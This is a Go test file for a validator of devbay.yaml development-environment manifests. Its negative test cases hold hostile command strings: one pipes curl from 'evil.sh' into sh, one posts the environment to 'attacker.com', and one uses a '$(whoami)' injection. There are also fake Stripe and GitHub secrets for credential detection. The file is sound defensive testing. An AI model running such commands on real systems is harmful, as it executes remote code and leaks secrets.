package manifest

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The five hand-written fixtures are the M−1 spec gate made executable. If a
// change to the schema or the validator breaks one of them, the format has
// stopped describing a real repository and the change is wrong.
func TestFixturesValidate(t *testing.T) {
	paths, err := filepath.Glob("../../testdata/repos/*/devbay.yaml")
	if err != nil || len(paths) == 0 {
		t.Fatalf("no fixtures found: %v", err)
	}
	if len(paths) != 5 {
		t.Errorf("expected 5 fixtures, found %d — the gate was defined over five dissimilar repos", len(paths))
	}

	for _, p := range paths {
		t.Run(filepath.Base(filepath.Dir(p)), func(t *testing.T) {
			m, err := Load(p)
			if err != nil {
				t.Fatalf("load: %v", err)
			}
			r := Validate(m)
			for _, d := range r.Errors() {
				t.Errorf("unexpected error: %s", d)
			}
			for _, d := range r.Approvals() {
				t.Logf("approval required: %s -> %s", d.Path, strings.Join(d.Argv, " "))
			}
			for _, d := range r.Warnings() {
				t.Logf("warn: %s", d)
			}
			if m.PrimaryService() == "" {
				t.Error("no primary service resolved; the bay would have no bare hostname")
			}
		})
	}
}

// Fixture-specific assertions. These pin the findings the gate produced, so a
// later refactor cannot quietly undo them.
func TestFixtureProperties(t *testing.T) {
	t.Run("mastodon workers use non-port probes", func(t *testing.T) {
		m := load(t, "mastodon")
		for _, name := range []string{"sidekiq", "assets"} {
			s := m.Services[name]
			if s == nil {
				t.Fatalf("%s missing", name)
			}
			if s.Port != 0 {
				t.Errorf("%s: expected no port", name)
			}
			if s.Health.Log == "" {
				t.Errorf("%s: expected a log probe; these two services are why health.log exists", name)
			}
		}
	})

	t.Run("mastodon merge keys resolve", func(t *testing.T) {
		// The fixture shares env via a YAML anchor. yaml.v3 must resolve it
		// the same way PyYAML did, or the fixture is a landmine.
		m := load(t, "mastodon")
		for _, name := range []string{"web", "sidekiq", "db-setup"} {
			if got := m.Services[name].Env["REDIS_URL"]; got != "${bay.redis.url}" {
				t.Errorf("%s: merge key not resolved, REDIS_URL=%q", name, got)
			}
		}
	})

	t.Run("documenso multi-port services", func(t *testing.T) {
		m := load(t, "documenso")
		if got := m.Services["storage"].Ports["console"]; got != 9001 {
			t.Errorf("storage console port = %d, want 9001", got)
		}
		if got := m.Services["mail"].Ports["smtp"]; got != 1025 {
			t.Errorf("mail smtp port = %d, want 1025", got)
		}
		// The address-plane distinction, pinned. Getting this backwards is the
		// most likely source of "works in the browser, breaks in SSR".
		env := m.Services["web"].Env
		if !strings.Contains(env["NEXT_PRIVATE_INTERNAL_WEBAPP_URL"], ".url}") {
			t.Error("server-side URL should use .url (container network), not .public_url")
		}
		if !strings.Contains(env["NEXT_PUBLIC_WEBAPP_URL"], ".public_url}") {
			t.Error("browser-exposed URL should use .public_url")
		}
	})

	t.Run("oneshot ordering replaces setup lists", func(t *testing.T) {
		m := load(t, "fastapi-template")
		for _, name := range []string{"wait-db", "alembic", "prestart"} {
			if !m.Services[name].IsOneshot() {
				t.Errorf("%s should be a oneshot", name)
			}
		}
		// The app must wait for seeding, not race it.
		if !dependsOn(m, "backend", "prestart") {
			t.Error("backend must transitively depend on prestart")
		}
		if !dependsOn(m, "prestart", "alembic") {
			t.Error("prestart must run after migrations")
		}
	})

	t.Run("gitea streaming report needs no path", func(t *testing.T) {
		m := load(t, "gitea")
		r := m.Tasks["unit"].Report
		if r.Format != ReportGoJSON || r.Path != "" {
			t.Errorf("go-json report should stream with no path, got %+v", r)
		}
	})

	t.Run("documenso requires install scripts and says so", func(t *testing.T) {
		m := load(t, "documenso")
		if !m.Services["web"].InstallScripts {
			t.Error("documenso needs patch-package as a postinstall; the fixture should say so explicitly")
		}
		var warned bool
		for _, d := range Validate(m).Warnings() {
			if strings.Contains(d.Path, "install_scripts") {
				warned = true
			}
		}
		if !warned {
			t.Error("enabling install scripts must produce a visible warning, not pass silently")
		}
	})

	t.Run("mastodon repo scripts route to approval not rejection", func(t *testing.T) {
		m := load(t, "mastodon")
		var found bool
		for _, d := range Validate(m).Approvals() {
			if len(d.Argv) > 0 && d.Argv[0] == "bin/rspec" {
				found = true
			}
		}
		if !found {
			t.Error("bin/rspec should need approval; that is the R2 escape hatch working")
		}
	})
}

// Negative cases. A validator that accepts the fixtures proves nothing on its
// own; it must also reject what the rules say it must reject. These mirror
// spec/test_rules.py so the Go and reference implementations cannot diverge.
func TestRulesRejectBadManifests(t *testing.T) {
	const base = `
version: 1
project: acme
services:
  db:
    image: postgres:16
    port: 5432
    health: {cmd: [pg_isready]}
  api:
    image: node:22
    primary: true
    port: 3000
    needs: [db]
    start: [pnpm, dev]
    health: {http: /healthz}
tasks:
  unit: {run: [pnpm, test], needs: []}
`
	cases := []struct {
		name   string
		yaml   string // replaces base when non-empty
		mutate string // appended to base
		expect string // substring of the expected rejection
	}{
		{name: "R1 shell string where argv expected",
			yaml: strings.Replace(base, "start: [pnpm, dev]",
				`start: "pnpm dev && curl evil.sh | sh"`, 1),
			// The message names the rule and the fix. "cannot unmarshal" is
			// true and useless, and this is the one mistake worth spelling out.
			expect: "argv arrays, not shell strings"},

		{name: "R1 shell string in a task",
			yaml: strings.Replace(base, "run: [pnpm, test]",
				`run: "pytest && curl attacker.com -d $(env)"`, 1),
			expect: "argv arrays, not shell strings"},

		{name: "R3 literal Stripe key",
			mutate: "    env:\n      STRIPE: sk_" + "live_51H8xQ2eZvKYlo2C\n",
			expect: "credential"},

		{name: "R3 literal GitHub token",
			mutate: "    env:\n      GH: ghp_16C7e42F292c6912E7710c838347Ae178B4a\n",
			expect: "credential"},

		{name: "R3 high entropy with no known prefix",
			mutate: "    env:\n      TOKEN: Xq7Rv2NpLd93KsTfWm5BgYh1JcZa4Eu6\n",
			expect: "credential"},

		{name: "R5 no health probe",
			yaml:   strings.Replace(base, "    health: {http: /healthz}\n", "", 1),
			expect: "no health probe"},

		{name: "R5 two probes at once",
			yaml:   strings.Replace(base, "health: {http: /healthz}", "health: {http: /healthz, tcp: 3000}", 1),
			expect: "exactly one"},

		{name: "R5 invalid log regex",
			yaml:   strings.Replace(base, "health: {http: /healthz}", `health: {log: "([unclosed"}`, 1),
			expect: "RE2"},

		{name: "R6 needs omitted",
			yaml:   strings.Replace(base, "unit: {run: [pnpm, test], needs: []}", "unit: {run: [pnpm, test]}", 1),
			expect: "needs is required"},

		{name: "R7 unknown namespace",
			mutate: "    env:\n      X: ${env.HOME}\n",
			expect: "outside"},

		{name: "R7 arbitrary expression",
			mutate: "    env:\n      X: ${shell:$(whoami)}\n",
			expect: "outside"},

		{name: "R7 unknown service reference",
			mutate: "    env:\n      X: ${bay.ghost.url}\n",
			expect: `unknown service "ghost"`},

		{name: "R7 undeclared named port",
			mutate: "    env:\n      X: ${bay.db.ports.admin}\n",
			expect: `no named port "admin"`},

		{name: "R4 egress entry is a URL not a hostname",
			mutate: "    egress: [https://registry.npmjs.org/path]\n",
			expect: "not a hostname"},

		{name: "needs unknown service",
			yaml:   strings.Replace(base, "needs: [db]", "needs: [nope]", 1),
			expect: `unknown service "nope"`},

		{name: "dependency cycle",
			yaml:   strings.Replace(base, "    port: 5432\n", "    port: 5432\n    needs: [api]\n", 1),
			expect: "cycle"},

		{name: "self dependency",
			yaml:   strings.Replace(base, "needs: [db]", "needs: [api]", 1),
			expect: "itself"},

		{name: "oneshot with a port",
			mutate: "  mig:\n    kind: oneshot\n    image: node:22\n    run: [pnpm, migrate]\n    port: 9999\n",
			expect: "cannot serve a port"},

		{name: "oneshot with no run",
			mutate: "  mig:\n    kind: oneshot\n    image: node:22\n",
			expect: "needs a run command"},

		{name: "oneshot declaring health",
			mutate: "  mig:\n    kind: oneshot\n    image: node:22\n    run: [pnpm, migrate]\n    health: {process: true}\n",
			expect: "exit code is the probe"},

		{name: "service using run instead of start",
			yaml:   strings.Replace(base, "start: [pnpm, dev]", "run: [pnpm, dev]", 1),
			expect: "uses start, not run"},

		{name: "seed after a non-oneshot",
			yaml: strings.Replace(base, "    port: 5432\n",
				"    port: 5432\n    fork: image\n    seed: {after: [api], sources: [\"m/**\"]}\n", 1),
			expect: "must be kind: oneshot"},

		{name: "seed with no staleness sources",
			yaml: strings.Replace(base, "    port: 5432\n",
				"    port: 5432\n    fork: image\n    seed: {after: [api], sources: []}\n", 1),
			expect: "stale"},

		{name: "two services claim primary",
			yaml:   strings.Replace(base, "    port: 5432\n", "    port: 5432\n    primary: true\n", 1),
			expect: "claim primary"},

		{name: "no primary with several ported services",
			yaml: strings.Replace(strings.Replace(base, "    primary: true\n", "", 1),
				"tasks:", "  web:\n    image: node:22\n    port: 5173\n    health: {log: ready}\ntasks:", 1),
			expect: "must set primary"},

		{name: "neither image nor build",
			yaml:   strings.Replace(base, "    image: node:22\n", "", 1),
			expect: "either image or build"},

		{name: "both image and build",
			mutate: "    build: {context: .}\n",
			expect: "mutually exclusive"},

		{name: "unknown key is not silently ignored",
			mutate: "    strat: [pnpm, dev]\n",
			expect: "field strat not found"},

		{name: "named port duplicates the primary",
			mutate: "    ports: {admin: 3000}\n",
			expect: "duplicates the primary port"},

		{name: "bad duration",
			yaml:   strings.Replace(base, "health: {http: /healthz}", "health: {http: /healthz, timeout: 30 seconds}", 1),
			expect: "not a duration"},

		{name: "project name is not a DNS label",
			yaml:   strings.Replace(base, "project: acme", "project: Acme_Corp", 1),
			expect: "not a DNS label"},

		{name: "unsupported version",
			yaml:   strings.Replace(base, "version: 1", "version: 2", 1),
			expect: "unsupported version"},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			src := c.yaml
			if src == "" {
				// Append the mutation to the api service block.
				src = strings.Replace(base, "    health: {http: /healthz}\n",
					"    health: {http: /healthz}\n"+c.mutate, 1)
				if strings.HasPrefix(strings.TrimLeft(c.mutate, " "), "mig:") {
					src = strings.Replace(base, "tasks:", c.mutate+"tasks:", 1)
				}
			}

			m, err := Parse([]byte(src))
			if err != nil {
				// Structural rejections (R1, unknown keys) fail at decode.
				if !strings.Contains(err.Error(), c.expect) {
					t.Fatalf("rejected at parse, but for the wrong reason:\n  got:  %v\n  want: %q", err, c.expect)
				}
				return
			}
			r := Validate(m)
			if r.OK() {
				t.Fatalf("accepted, but must be rejected\n%s", src)
			}
			var msgs []string
			for _, d := range r.Errors() {
				msgs = append(msgs, d.String())
			}
			joined := strings.Join(msgs, "\n")
			if !strings.Contains(joined, c.expect) {
				t.Errorf("rejected for the wrong reason:\n  got:\n%s\n  want substring: %q", joined, c.expect)
			}
		})
	}
}

// A manifest with no errors must still surface an approval for anything off
// the allowlist, and must not surface one for anything on it.
func TestAllowlistBoundary(t *testing.T) {
	for _, c := range []struct {
		argv0  string
		needed bool
	}{
		{"pnpm", false},
		{"go", false},
		{"pytest", false},
		{"bin/rspec", true},
		{"bash", true},
		{"curl", true},
		{"./scripts/dev.sh", true},
	} {
		src := strings.Replace(`
version: 1
project: acme
services:
  api:
    image: node:22
    port: 3000
    start: [ARGV0, x]
    health: {http: /}
tasks:
  unit: {run: [pnpm, test], needs: []}
`, "ARGV0", c.argv0, 1)
		m, err := Parse([]byte(src))
		if err != nil {
			t.Fatalf("%s: parse: %v", c.argv0, err)
		}
		r := Validate(m)
		if err := r.Err(); err != nil {
			t.Fatalf("%s: unexpected errors: %v", c.argv0, err)
		}
		got := len(r.Approvals()) > 0
		if got != c.needed {
			t.Errorf("argv0 %q: approval required = %v, want %v", c.argv0, got, c.needed)
		}
	}
}

func load(t *testing.T, name string) *Manifest {
	t.Helper()
	p := filepath.Join("../../testdata/repos", name, "devbay.yaml")
	if _, err := os.Stat(p); err != nil {
		t.Fatalf("fixture %s: %v", name, err)
	}
	m, err := Load(p)
	if err != nil {
		t.Fatalf("fixture %s: %v", name, err)
	}
	return m
}

// YAML resolves bare true, 5 and null to a boolean, an integer and a null, and
// the decoder coerces them into "true", "5" and "". That is how `run: [true]`
// came to mean the /bin/true command by accident, and it made devbay accept
// manifests the published schema rejects -- so a third party reimplementing
// from the spec would refuse a file devbay runs happily.
func TestCommandArgumentsMustBeWrittenAsStrings(t *testing.T) {
	for _, tc := range []struct{ name, argv string }{
		{"boolean", `[true]`},
		{"integer", `[sleep, 5]`},
		{"null", `[echo, null]`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Parse([]byte(`
version: 1
project: p
services:
  web: {image: node:22, port: 3000, primary: true, health: {http: /}}
tasks:
  unit: {run: ` + tc.argv + `, needs: []}
`))
			if err == nil {
				t.Fatalf("%s was coerced into a string instead of being refused", tc.name)
			}
			// The message has to name the fix; "cannot unmarshal" would not.
			if !strings.Contains(err.Error(), "must be strings") {
				t.Errorf("the message does not say what to write: %v", err)
			}
		})
	}

	// And the quoted forms are accepted, since they are what the fix asks for.
	if _, err := Parse([]byte(`
version: 1
project: p
services:
  web: {image: node:22, port: 3000, primary: true, health: {http: /}}
tasks:
  unit: {run: ["true"], needs: []}
  wait: {run: [sleep, "5"], needs: []}
`)); err != nil {
		t.Errorf("the quoted form was refused: %v", err)
	}
}

// An emulator is devbay's own choice, so writing one down should not be
// research: a developer asking for a mail catcher should not also have to know
// which ports it listens on, and getting either wrong produces a bay that
// boots and quietly cannot send mail.
func TestExternalsBecomeServices(t *testing.T) {
	m, err := Parse([]byte(`
version: 1
project: p
externals:
  mail: {emulate: mailpit}
services:
  web: {image: nginx:alpine, port: 80, primary: true, health: {http: /}}
tasks:
  unit: {run: ["true"], needs: []}
`))
	if err != nil {
		t.Fatal(err)
	}
	mail := m.Services["mail"]
	if mail == nil {
		t.Fatal("the external did not become a service, so nothing would start it")
	}
	if mail.Port == 0 || mail.Ports["smtp"] == 0 {
		t.Errorf("the emulator's ports were not filled in: %+v", mail)
	}
	if mail.Health == nil {
		t.Error("the emulator has no health probe, so devbay could not tell when it is ready")
	}
	// It has to survive validation as an ordinary service, because that is
	// what it now is.
	if r := Validate(m); len(r.Errors()) > 0 {
		t.Errorf("an expanded emulator does not validate: %v", r.Err())
	}
	// And its argv is devbay's, not the repository's, so it must not ask the
	// developer to approve a command they did not write.
	for _, d := range Validate(m).Approvals() {
		if strings.HasPrefix(d.Location(), "services/mail") {
			t.Errorf("an emulator devbay chose asked for approval: %s", d.Msg)
		}
	}
}

func TestAnUnknownEmulatorIsRefusedWithTheList(t *testing.T) {
	_, err := Parse([]byte(`
version: 1
project: p
externals:
  mail: {emulate: not-a-thing}
services:
  web: {image: nginx:alpine, port: 80, primary: true, health: {http: /}}
tasks:
  unit: {run: ["true"], needs: []}
`))
	if err == nil {
		t.Fatal("an unknown emulator was accepted, so nothing would ever start it")
	}
	if !strings.Contains(err.Error(), "mailpit") {
		t.Errorf("the message does not say what is available: %v", err)
	}
}

// A service the repository writes out wins over the catalogue: the developer
// has already made every decision it would have made for them.
func TestAnExplicitServiceBeatsTheCatalogue(t *testing.T) {
	m, err := Parse([]byte(`
version: 1
project: p
externals:
  mail: {emulate: mailpit}
services:
  mail: {image: axllent/mailpit:v1.20, port: 8025, health: {tcp: 8025}}
  web: {image: nginx:alpine, port: 80, primary: true, health: {http: /}}
tasks:
  unit: {run: ["true"], needs: []}
`))
	if err != nil {
		t.Fatal(err)
	}
	if got := m.Services["mail"].Image; got != "axllent/mailpit:v1.20" {
		t.Errorf("the catalogue overwrote an explicit service: image = %q", got)
	}
}

// A fork strategy only means anything for a service shared between bays, and
// with the default per-bay scope each bay already has its own instance. The
// manifest is not wrong, so this is a warning that says why the field will not
// change anything -- silence would leave the developer believing they had
// configured something.
func TestAnInertForkStrategyIsExplained(t *testing.T) {
	m, err := Parse([]byte(`
version: 1
project: p
services:
  cache:
    image: redis:7-alpine
    port: 6379
    fork: prefix
    health: {tcp: 6379}
  web: {image: nginx:alpine, port: 80, primary: true, health: {http: /}}
tasks:
  unit: {run: ["true"], needs: []}
`))
	if err != nil {
		t.Fatal(err)
	}
	r := Validate(m)
	if len(r.Errors()) > 0 {
		t.Fatalf("a fork strategy should not be an error: %v", r.Err())
	}
	var explained bool
	for _, d := range r.Warnings() {
		if strings.Contains(d.Msg, "has no effect on a per-bay service") {
			explained = true
		}
	}
	if !explained {
		t.Error("an inert fork strategy passed without a word, so it looks configured")
	}
}

// Fields the format describes and devbay does not honour are refused rather
// than ignored. A manifest that validates and is then silently not obeyed is
// the worst outcome available: the developer believes they have isolated a
// datastore and nothing says otherwise.
func TestUnimplementedFieldsAreRefusedRatherThanIgnored(t *testing.T) {
	for _, tc := range []struct{ name, mutate, expect string }{
		{"shared scope", "    scope: shared\n", "not implemented"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			m, err := Parse([]byte(`
version: 1
project: p
services:
  db:
    image: postgres:16
    port: 5432
    health: {tcp: 5432}
` + tc.mutate + `  web: {image: nginx:alpine, port: 80, primary: true, health: {http: /}}
tasks:
  unit: {run: ["true"], needs: []}
`))
			if err != nil {
				t.Fatal(err)
			}
			r := Validate(m)
			var found bool
			for _, d := range r.Errors() {
				if strings.Contains(d.Msg, tc.expect) {
					found = true
				}
			}
			if !found {
				t.Errorf("%s was accepted and would then be ignored: %v", tc.name, r.Err())
			}
		})
	}
}

// A field that parses and does nothing is the defect this project keeps
// finding; supervision: was the last one.
func TestSupervisionIsRefusedRatherThanIgnored(t *testing.T) {
	m := load(t, "gitea")
	m.Supervision = &Supervision{}
	r := Validate(m)
	if r.OK() {
		t.Fatal("supervision: was accepted, so a developer would write it and get nothing")
	}
	if !strings.Contains(r.Err().Error(), "not implemented") {
		t.Errorf("the refusal did not say why: %v", r.Err())
	}
}

// The socket is the most dangerous thing a manifest can ask for, so it is
// neither refused (devbay could then not run what Docker runs) nor granted
// quietly.
func TestDockerSocketNeedsApproval(t *testing.T) {
	m := load(t, "gitea")
	for _, s := range m.Services {
		s.DockerSocket = true
		break
	}
	r := Validate(m)
	if !r.OK() {
		t.Fatalf("docker_socket made the manifest invalid: %v", r.Err())
	}
	var found bool
	for _, d := range r.Approvals() {
		if strings.Contains(d.Path, "docker_socket") {
			found = true
			if len(d.Argv) == 0 {
				t.Error("the approval carries no key, so it could never be granted or remembered")
			}
			if !strings.Contains(d.Msg, "any other container") {
				t.Errorf("the approval does not say what it grants: %q", d.Msg)
			}
		}
	}
	if !found {
		t.Error("the Docker socket was granted without asking anyone")
	}
}
